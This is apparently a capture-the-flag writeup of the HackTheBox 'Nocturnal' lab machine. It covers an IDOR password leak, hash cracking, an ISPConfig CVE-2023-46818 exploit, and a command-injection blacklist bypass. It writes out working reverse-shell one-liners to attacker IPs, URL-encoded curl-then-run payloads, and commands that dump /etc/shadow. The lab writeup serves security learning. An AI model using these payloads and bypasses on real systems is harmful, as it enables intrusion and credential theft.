---
render_with_liquid: false
title: HackTheBox Writeup - Nocturnal
date: 2025-04-03 06:12:18 +1400
tags: [hackthebox, nmap, linux, php, feroxbuster, idor, ffuf, backup-solution, file-download, sqlite, hashcat, credentials-stuffing, port-forwarding, ispconfig, cve-2023-46818, code-injection, command-injection, command-injection-bypass]
image:
    path: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e865cff-5694-4578-883d-88d69c742298.png
    width: 640
    height: 480
---



`Nocturnal` is a medium-difficulty Linux machine demonstrating an IDOR vulnerability in a PHP web application, allowing access to other users&amp;#039; uploaded files. Credentials are retrieved to log in to the admin panel, where the application&amp;#039;s source code is accessed. A command injection vulnerability is identified, providing a reverse shell as the `www-data` user. Password hashes are extracted from a SQLite database and cracked to obtain SSH access as the `tobias` user. Exploiting [CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818) in the `ISPConfig` application grants remote command execution, leading to privilege escalation to the `root` user.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ pt init '10.129.232.25 nocturnal.htb'
+-----------+--------+---------------+---------------+
|  PROFILE  | STATUS |      IP       |    DOMAIN     |
+-----------+--------+---------------+---------------+
| nocturnal | on     | 10.129.232.25 | nocturnal.htb |
+-----------+--------+---------------+---------------+
```

## Nmap

```bash
# Nmap 7.95 scan initiated Thu Apr  3 06:12:17 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.129.232.25
Nmap scan report for 10.129.232.25
Host is up, received user-set (0.20s latency).
Scanned at 2025-04-03 06:12:18 CST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  3 06:12:31 2025 -- 1 IP address (1 host up) scanned in 13.74 seconds
```


## 80 - HTTP : Welcome to Nocturnal


### Info

```ruby
http://nocturnal.htb [200] [Welcome to Nocturnal] [nginx/1.18.0 (Ubuntu)] [00f11d15c8c2315c77b5e1e64546701a260cb31b] [Nginx:1.18.0,PHP,Ubuntu]
```

![](/assets/obsidian/f29a2e5e79161959ad771f243ec2ec5e.png)

### Directory

```bash
URL="http://$(pt get rhost):80"; OUT="$(echo $URL | awk -F'://' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -u "$URL" -o "ferox_${OUT}.txt" -C 404
```

```ruby
200      GET       21l       45w      644c http://nocturnal.htb/login.php
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET      161l      327w     3105c http://nocturnal.htb/style.css
200      GET       29l      145w     1524c http://nocturnal.htb/
403      GET       13l       82w      564c http://nocturnal.htb/uploads
301      GET        7l       12w      178c http://nocturnal.htb/backups => http://nocturnal.htb/backups/
403      GET       13l       82w      564c http://nocturnal.htb/backups/
403      GET        7l       10w      162c http://nocturnal.htb/uploads_admin
403      GET       13l       82w      564c http://nocturnal.htb/uploads_user
403      GET       13l       82w      564c http://nocturnal.htb/uploads_group
403      GET       13l       82w      564c http://nocturnal.htb/uploads2
403      GET       13l       82w      564c http://nocturnal.htb/uploads_event
403      GET        7l       10w      162c http://nocturnal.htb/uploads_video
403      GET       13l       82w      564c http://nocturnal.htb/uploads_forum
403      GET        7l       10w      162c http://nocturnal.htb/uploads_game
403      GET        7l       10w      162c http://nocturnal.htb/uploads3
403      GET        7l       10w      162c http://nocturnal.htb/uploadscript
```


# User Flag
---

## Shell as tobias


### 80 - Nocturnal : Testing file upload function

Register an account and login to access the functions

> http://nocturnal.htb/register.php

![](/assets/obsidian/372349d6ace2afab90f69f70081a750e.png)

There's a file upload form in the dashboard, only those file extensions are allowed : `pdf, doc, docx, xls, xlsx, odt`

> http://nocturnal.htb/dashboard.php

![](/assets/obsidian/a8558424ebb6a7cec0472dcc1673898e.png)

![](/assets/obsidian/df7062cdd3ee3e7c0604a6d089ebb587.png)

Upload a test pdf file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ echo '<?php phpinfo(); ?>' > ~/Documents/test.pdf
```

After uploading, there's a list of uploaded files that can be viewed

![](/assets/obsidian/bf20e7b8001ae2c443efda562090d6c7.png)

By viewing the link, the file was downloaded instead of including, which means even if we bypassed the file upload restriction to upload a webshell, there's no way to abuse it

> http://nocturnal.htb/view.php?username=bravosec&file=test.pdf

![](/assets/obsidian/734e3537ecedf5000db33bb3a8e2035a.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ curl -H 'Cookie: PHPSESSID=cdl1pqe2j0a0lr1cml4bubldhm' 'http://nocturnal.htb/view.php?username=bravosec&file=test.pdf' -I
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
[...]
Content-Disposition: attachment; filename="test.pdf"
```


### 80 - File download : IDOR leads to password leak

By changing the `username` parameter's value from `bravosec` to `admin`, it returned `File does not exist` error, and a section of `Available files for download:`

![](/assets/obsidian/4be86b87915a2acb0feab48717149e2a.png)

This **IDOR** vulnerability makes us able to enumerate users and their uploaded files

We changed the file name to a file that does not exist then fuzz the usernames

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ ffuf -c --request-proto http -u 'http://nocturnal.htb/view.php?username=FUZZ&file=bravosec.pdf' -b 'PHPSESSID=cdl1pqe2j0a0lr1cml4bubldhm' -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -fs 2985 -o ffuf.json

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nocturnal.htb/view.php?username=FUZZ&file=bravosec.pdf
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Cookie: PHPSESSID=cdl1pqe2j0a0lr1cml4bubldhm
 :: Output file      : ffuf.json
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2985
________________________________________________

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 291ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 266ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 261ms]
```

Extract found user names to a list

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ cat ffuf.json | jq '.results[].input.FUZZ' -r | tee users.lst
admin
amanda
tobias
```

Loop through all users to check the files they've uploaded

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ for u in $(cat users.lst); do echo "[*] $u"; curl -s -H 'Cookie: PHPSESSID=cdl1pqe2j0a0lr1cml4bubldhm' "http://nocturnal.htb/view.php?username=$u&file=bravosec.pdf" | grep -oP "(?<=<a href=).*?(?=>)"; done
[*] admin
[*] amanda
"view.php?username=amanda&file=privacy.odt"
[*] tobias
```

Download `privacy.odt` that was uploaded by `amanda`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ curl -s -H 'Cookie: PHPSESSID=cdl1pqe2j0a0lr1cml4bubldhm' "http://nocturnal.htb/view.php?username=amanda&file=privacy.odt" > privacy.odt

┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ file privacy.odt
privacy.odt: Zip archive, with extra data prepended
```

The file was corrupted

![](/assets/obsidian/28a70fb617cdf91054316025fe729de2.png)

Extract the archive and view its content directly

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ unzip privacy.odt -d ./privacy
Archive:  privacy.odt
warning [privacy.odt]:  2919 extra bytes at beginning or within zipfile
  (attempting to process anyway)
 extracting: ./privacy/mimetype
   creating: ./privacy/Configurations2/accelerator/
   creating: ./privacy/Configurations2/images/Bitmaps/
   creating: ./privacy/Configurations2/toolpanel/
   creating: ./privacy/Configurations2/floater/
   creating: ./privacy/Configurations2/statusbar/
   creating: ./privacy/Configurations2/toolbar/
   creating: ./privacy/Configurations2/progressbar/
   creating: ./privacy/Configurations2/popupmenu/
   creating: ./privacy/Configurations2/menubar/
  inflating: ./privacy/styles.xml
  inflating: ./privacy/manifest.rdf
  inflating: ./privacy/content.xml
  inflating: ./privacy/meta.xml
  inflating: ./privacy/settings.xml
 extracting: ./privacy/Thumbnails/thumbnail.png
  inflating: ./privacy/META-INF/manifest.xml
```

We've got a potential temporary password : `arHkG7HAI68X8s1J` for `amanda`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ xmllint --format privacy/content.xml | grep 'text:'
[...]
      <text:p text:style-name="P1">Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.</text:p>
      <text:p text:style-name="P1">The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.</text:p>
      <text:p text:style-name="P1">Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Yours sincerely,</text:p>
      <text:p text:style-name="P1">Nocturnal's IT team</text:p>
```


### (Failed) 22 - SSH : Credential stuffing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ cssh $(pt get rhost) amanda 'arHkG7HAI68X8s1J'
Warning: Permanently added 'nocturnal.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.

┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ cssh $(pt get rhost) Amanda 'arHkG7HAI68X8s1J'
Warning: Permanently added 'nocturnal.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.

┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ cssh $(pt get rhost) root 'arHkG7HAI68X8s1J'
Warning: Permanently added 'nocturnal.htb' (ED25519) to the list of known hosts.
Permission denied, please try again.
```


### 80 - Admin panel : Backups download leads to database exposure

By logging in as `amanda` with the password `arHkG7HAI68X8s1J`, we can access the **Admin Panel**

> http://nocturnal.htb/login.php

![](/assets/obsidian/586b041640f4e38520e80ffffbe482a6.png)

There's a file view function where we can view php files' content

> http://nocturnal.htb/admin.php

![](/assets/obsidian/65859c306294ac967a318eeab86a8cfe.png)

We can create a backup with password and download it, which includes a **sqlite** database file

![](/assets/obsidian/c76b7c2c0bad55fb2cc4080ce95fba6e.png)

Unzip the backup

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ mv ~/Downloads/backup_2025-04-14.zip ./loot

┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ cd loot

┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/loot]
└─$ unzip backup_2025-04-14.zip -d backup_2025-04-14
Archive:  backup_2025-04-14.zip
[backup_2025-04-14.zip] admin.php password:
  inflating: backup_2025-04-14/admin.php
   creating: backup_2025-04-14/uploads/
  inflating: backup_2025-04-14/uploads/privacy.odt
  inflating: backup_2025-04-14/register.php
  inflating: backup_2025-04-14/login.php
  inflating: backup_2025-04-14/dashboard.php
  inflating: backup_2025-04-14/nocturnal_database.db
  inflating: backup_2025-04-14/index.php
  inflating: backup_2025-04-14/view.php
  inflating: backup_2025-04-14/logout.php
  inflating: backup_2025-04-14/style.css
```

Extract `<username>:<hash>` from the database to a list

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/loot]
└─$ sqlite3 backup_2025-04-14/nocturnal_database.db .dump | grep 'INSERT INTO users' | awk -F"'" '{print $2":"$4}' | tee nocturnal_database.db.hash
admin:d725aeba143f575736b07e045d8ceebb
amanda:df8b20aa0c935023f99ea58358fb63c4
tobias:55c82b1ccd55ab219b3b109b07d5061d
```

Crack the hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/loot]
└─$ hashcat nocturnal_database.db.hash /opt/wordlists/rockyou.txt --user -m 0
hashcat (v6.2.6) starting
[...]

┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/loot]
└─$ hashcat nocturnal_database.db.hash /opt/wordlists/rockyou.txt --user -m 0 --show
tobias:55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```


### 22 - SSH : Credential stuffing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ cssh $(pt get rhost) tobias 'slowmotionapocalypse'
Warning: Permanently added 'nocturnal.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)
[...]

Last login: Mon Apr 14 11:11:43 2025 from 10.10.14.11
tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)
tobias@nocturnal:~$ cat user.txt
ffaf43c687d4f1d8f0bf4cb70475fc3b
```

# Root Flag
---

## From tobias to root


### Enumeration

> **ispconfig** is running as `root` on port `8080`, and it was installed recently
{: .prompt-tip }

- Users with shell

```bash
tobias@nocturnal:~$ for u in $(cat /etc/passwd | grep sh$ | cut -d":" -f1 2>/dev/null);do id $u;done 2>/dev/null | sort -unt '=' -k2
uid=0(root) gid=0(root) groups=0(root)
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)
uid=1001(ispapps) gid=1002(ispapps) groups=1002(ispapps)
uid=1002(ispconfig) gid=1003(ispconfig) groups=1003(ispconfig)
```

- Processes running as root

```bash
tobias@nocturnal:~$ ps auxfw5 | grep ^root | grep -vF '\_'
root           2  0.0  0.0      0     0 ?        S    Apr13   0:00 [kthreadd]
root           1  0.0  0.2 168176 11540 ?        Ss   Apr13   0:05 /sbin/init maybe-ubiquity
root         489  0.0  5.0 315920 202160 ?       S<s  Apr13   0:18 /lib/systemd/systemd-journald
root         520  0.0  0.1  22652  5972 ?        Ss   Apr13   0:00 /lib/systemd/systemd-udevd
root         667  0.0  0.4 214600 17948 ?        SLsl Apr13   0:04 /sbin/multipathd -d -s
root         697  0.0  0.0  11356  1608 ?        S<sl Apr13   0:03 /sbin/auditd
root         738  0.0  0.2  47548 10852 ?        Ss   Apr13   0:00 /usr/bin/VGAuthService
root         740  0.0  0.2 311548  8700 ?        Ssl  Apr13   0:47 /usr/bin/vmtoolsd
root         751  0.0  0.1  99900  5812 ?        Ssl  Apr13   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         768  0.0  0.1 235652  7472 ?        Ssl  Apr13   0:03 /usr/lib/accountsservice/accounts-daemon
root         779  0.0  0.0  81960  3744 ?        Ssl  Apr13   0:01 /usr/sbin/irqbalance --foreground
root         780  0.0  0.4  29668 18464 ?        Ss   Apr13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         781  0.0  0.2 234432  8700 ?        Ssl  Apr13   0:08 /usr/lib/policykit-1/polkitd --no-debug
root         785  0.0  0.1  17548  7644 ?        Ss   Apr13   0:01 /lib/systemd/systemd-logind
root         786  0.0  0.3 393264 12328 ?        Ssl  Apr13   0:00 /usr/lib/udisks2/udisksd
root         821  0.0  0.2 315116 11800 ?        Ssl  Apr13   0:00 /usr/sbin/ModemManager
root        1002  0.0  0.7 212320 30936 ?        Ss   Apr13   0:02 /usr/bin/php -S 127.0.0.1:8080
root        1014  0.0  0.0   6816  2972 ?        Ss   Apr13   0:00 /usr/sbin/cron -f
root        1015  0.0  0.6 212396 27760 ?        Ss   Apr13   0:03 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root        1035  0.0  0.1  12188  6932 ?        Ss   Apr13   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1048  0.0  0.0  51212  1544 ?        Ss   Apr13   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root        1066  0.0  0.0   5828  1840 tty1     Ss+  Apr13   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1282  0.0  0.1  22924  5104 ?        Ss   Apr13   0:01 sendmail: MTA: accepting connections
root        4302  0.0  0.2 249520  9620 ?        Ssl  05:34   0:00 /usr/lib/upower/upowerd
```

- Listening ports

```bash
tobias@nocturnal:~$ ss -ltnpu | awk '$4 !~ /0.0.0.0|::/'
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*
tcp    LISTEN  0       10           127.0.0.1:25           0.0.0.0:*
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*
tcp    LISTEN  0       10           127.0.0.1:587          0.0.0.0:*
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*
tcp    LISTEN  0       4096         127.0.0.1:8080         0.0.0.0:*
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*
tcp    LISTEN  0       128               [::]:22              [::]:*
```

- Web directory

```bash
tobias@nocturnal:~$ ls -latr /var/www
total 20
drwxr-xr-x  4 ispconfig ispconfig 4096 Oct 17 01:29 php-fcgi-scripts
lrwxrwxrwx  1 root      root        34 Oct 17 02:37 ispconfig -> /usr/local/ispconfig/interface/web
drwxr-xr-x 14 root      root      4096 Oct 18 00:00 ..
drwxr-xr-x  5 ispconfig ispconfig 4096 Mar  4 15:02 .
drwxr-xr-x  2 root      root      4096 Mar  4 15:02 html
drwxr-xr-x  4 www-data  www-data  4096 Apr  9 10:56 nocturnal.htb
```

- Nginx sites config

```bash
tobias@nocturnal:~$ ls -latr /etc/nginx/sites-enabled/
total 8
drwxr-xr-x 8 root root 4096 Mar  4 15:02 ..
lrwxrwxrwx 1 root root   40 Mar  4 15:22 nocturnal.htb -> /etc/nginx/sites-available/nocturnal.htb
drwxr-xr-x 2 root root 4096 Mar 18 12:30 .
tobias@nocturnal:~$ cat /etc/nginx/sites-available/nocturnal.htb | grep -iE 'listen |root |server_name '
    listen 80;
    server_name nocturnal.htb;
    root /var/www/nocturnal.htb;
```

- Recently installed programs

```bash
tobias@nocturnal:~$ for d in $(echo $PATH | sed 's/:/\n/g' | grep -i bin | grep -v ~); do echo "[*] $d"; ls --color=always -lahtr "${d}/" | tail; done
[*] /usr/local/sbin
total 7.0M
drwxr-xr-x 11 root root 4.0K Oct 17 02:37 ..
drwxr-xr-x  2 root root 4.0K Mar 18 13:57 .
-rwxr-xr-x  1 root root 7.0M Mar 18 13:57 laurel
[*] /usr/local/bin
total 16K
lrwxrwxrwx  1 root root   51 Oct 17 01:29 ispconfig_patch -> /usr/local/ispconfig/server/scripts/ispconfig_patch
drwxr-xr-x 11 root root 4.0K Oct 17 02:37 ..
lrwxrwxrwx  1 root root   61 Oct 17 02:37 letsencrypt_renew_hook.sh -> /usr/local/ispconfig/server/scripts/letsencrypt_renew_hook.sh
lrwxrwxrwx  1 root root   59 Oct 17 02:37 letsencrypt_pre_hook.sh -> /usr/local/ispconfig/server/scripts/letsencrypt_pre_hook.sh
lrwxrwxrwx  1 root root   60 Oct 17 02:37 letsencrypt_post_hook.sh -> /usr/local/ispconfig/server/scripts/letsencrypt_post_hook.sh
lrwxrwxrwx  1 root root   55 Oct 17 02:37 ispconfig_update.sh -> /usr/local/ispconfig/server/scripts/ispconfig_update.sh
lrwxrwxrwx  1 root root   55 Oct 17 02:37 ispconfig_update_from_dev.sh -> /usr/local/ispconfig/server/scripts/ispconfig_update.sh
drwxr-xr-x  2 root root 4.0K Oct 17 02:37 .
[...]
```


### 8080 - ISPConfig : Enumerate version

Local port forward `127.0.0.1:8080` from target to port `8080` on localhost

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ cssh $(pt get rhost) tobias 'slowmotionapocalypse' -N -L 8081:127.0.0.1:8080 -N
Last login: Mon Apr 14 11:27:11 2025 from 10.10.14.11
```

There is no version info on the web page when not authenticated

> http://127.0.0.1:8081/login/index.php

![](/assets/obsidian/e81d6f25c39587ade4e8ec78c201ebf0.png)

- Google : `ispconfig default credential`

![](/assets/obsidian/ea895dfb502e6348303d6697fc5c6346.png)

Tried the below combination in order and one succeeded

- [x] `admin:admin`
- [x] `admin:arHkG7HAI68X8s1J`
- [ ] `admin:slowmotionapocalypse`

![](/assets/obsidian/5aa6658dc3f90e04a765f615ca07ecf7.png)

Version info was revealed in the **Help** page : `3.2.10p1`

![](/assets/obsidian/8e59e02fb5f4b0214a8491d677622e4c.png)


### 8080 - ISPConfig 3.2.10p1 : PHP Code injection (CVE-2023-46818) (Authenticated)

- Google : `ISPConfig 3.2.10p1 exploit`

> CVE - https://pentest-tools.com/vulnerabilities-exploits/ispconfig-php-code-injection_23066

> **CVE-2023-46818**
> 
> An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if `admin_allow_langedit` is enabled.
{: .prompt-info }

- Google : `CVE-2023-46818 poc`

> POC - https://github.com/bipbopbup/CVE-2023-46818-python-exploit

Clone the exploit script then run it

```bash
cd exploit
git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit
```

Validated that exploit works

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/exploit/CVE-2023-46818-python-exploit]
└─$ python exploit.py http://127.0.0.1:8081 admin 'slowmotionapocalypse'
[+] Target URL: http://127.0.0.1:8081/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)
```

Start reverse shell listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/exploit/CVE-2023-46818-python-exploit]
└─$ nc -lvnp 53
listening on [any] 53 ...
```

Get a reverse shell as `root`

```bash
ispconfig-shell# /usr/bin/setsid /bin/bash -c "exec -a '/lib/systemd/systemd --user' /bin/sh &>/dev/tcp/10.10.14.11/53 0>&1 &"
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/exploit/CVE-2023-46818-python-exploit]
└─$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.11] from (UNKNOWN) [10.129.232.242] 53590
/usr/bin/script -qc /bin/bash /dev/null
root@nocturnal:/usr/local/ispconfig/interface/web/admin# ^Z
zsh: suspended  nc -lvnp 53

┌──(bravosec㉿fsociety)-[~/htb/Nocturnal/exploit/CVE-2023-46818-python-exploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 53
                             export TERM=xterm
root@nocturnal:/usr/local/ispconfig/interface/web/admin# stty rows 50 columns 209
root@nocturnal:/usr/local/ispconfig/interface/web/admin# cd ~
root@nocturnal:~# id
uid=0(root) gid=0(root) groups=0(root)
root@nocturnal:~# cat root.txt
ff18b3c74a8906c6e62a547d70771dde
```


# Additional
---

## Post exploitation


### Secrets

```bash
root@nocturnal:~# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$6$sJtQT08ZefRr6Awp$DBlWukQpaXmhYmGm52nQIqvRLc9DyXwxbDFM9F87xQcxX7B.e82r2/g7L3KZc4m7ywzuu6KGQsNi6vpguIXvi/:20014:0:99999:7:::
tobias:$6$kg9idJil/duVwNce$/29r1quOnEmdLDmeujzUUioimkjZTR/YqjiIk74u5K4X6N4NouhWoL4d3wQ4DZQpHnqZ1URYVATEb5/gz2AGV1:20014:0:99999:7:::
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```


## 80 - Admin panel : Command Injection (Bypass)


### Discover command injection via SAST

- There's a dangerous function `proc_open()` in `admin.php` which could lead to RCE
- We can control the `password` parameter, but it was protected by `cleanEntry` function

> http://nocturnal.htb/admin.php?view=admin.php

![](/assets/obsidian/e8a0adc04197d4b5052ce7ede806a0de.png)

- `cleanEntry` blacklists bad characters to prevent command injection

![](/assets/obsidian/1406fbee389d2bb17643fb411cf15736.png)


### Charactor blacklist bypass

> Since it doesn't blacklist **Url Encodings** (`%0*`), we can use new lines to execute additional commands, and use **TAB**s to replace **SPACE**s
{: .prompt-info }

Try to ping our machine

> Payload (Original) :

```
gg
bash	-c	"ping	10.10.14.30	-c	1"#
```

> Payload (URL Encoded) :

```
gg%0d%0abash%09-c%09%22ping%0910.10.14.30%09-c%091%22%23
```

![](/assets/obsidian/1a457e5d0480d47b09ef1595a54cb158.png)

Got a callback

![](/assets/obsidian/1d874568874a47936883f7626c6ec508.png)


### Get a shell

Start a http web server to host reverse shell script

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; mkdir -p www && echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.14.11/1111 0>&1' > www/index.html && python -m http.server $PORT -d www
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start reverse shell handler

```bash
nc -lvnp 1111
```

> Payload (Original) :

```
gg
bash	-c	"curl	10.10.14.30	>	/dev/shm/x
bash	/dev/shm/x"#
```

> Payload (URL Encoded) :

```
gg%0d%0abash%09-c%09%22curl%0910.10.14.30%09%3e%09%2fdev%2fshm%2fx%0abash%09%2fdev%2fshm%2fx%22%23
```

![](/assets/obsidian/66dcb2f41dbc2b00bfdcf1965de47d76.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.64] 44922
bash: cannot set terminal process group (884): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
www-data@nocturnal:~/nocturnal.htb$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
┌──(bravosec㉿fsociety)-[~/htb/Nocturnal]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@nocturnal:~/nocturnal.htb$ stty rows 25 columns 209
www-data@nocturnal:~/nocturnal.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```